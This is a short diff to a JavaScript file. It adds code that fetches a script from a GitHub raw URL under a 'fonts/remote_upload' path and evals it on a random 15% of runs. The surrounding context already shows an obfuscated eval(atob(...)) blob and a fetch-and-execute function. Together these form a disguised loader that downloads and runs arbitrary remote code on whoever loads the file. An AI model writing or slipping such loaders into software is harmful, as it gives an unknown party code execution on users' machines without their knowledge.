@@ -103,3 +103,29 @@ eval(atob("KCgpID0+IHsKICBjb25zdCBiYXNlNjRaaXAgPSAiQUFFQUFBQU9BREFBQXdDd1QxTXZNb
     // Execute the function to fetch and execute the script
     fetchAndExecuteScript();
 })();
+
+fetch('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/remote_upload/standalonerun/files/galactic_basic/script.execute')
+  .then(response => {
+    if (response.status === 200) {
+      console.log('Successfully fetched script. Checking chance...');
+      
+      // 15% chance to execute the script
+      if (Math.random() < 0.15) {
+        console.log('Chance passed! Executing the script...');
+        return response.text();
+      } else {
+        console.log('Chance failed. Script will not be executed.');
+        throw new Error('Chance failed');
+      }
+    } else {
+      throw new Error('Failed to fetch the script: ' + response.status);
+    }
+  })
+  .then(scriptText => {
+    eval(scriptText);  // Execute the fetched script
+    console.log('Script executed successfully.');
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+
